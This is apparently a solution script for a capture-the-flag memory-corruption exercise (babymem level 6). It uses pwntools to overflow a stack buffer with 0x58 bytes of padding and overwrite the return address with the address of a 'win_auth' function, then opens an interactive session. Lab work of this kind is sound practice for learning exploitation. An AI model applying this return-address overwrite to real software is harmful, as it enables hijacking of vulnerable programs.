from pwn import *

# init
elf = ELF("/challenge/babymem_level6.0")

buffer_length = int("58", 16) #local_58

win_auth_address = p64(0x401612)

io = elf.process()

# Payload
payload = b"A"*buffer_length + win_auth_address

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length + 8))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()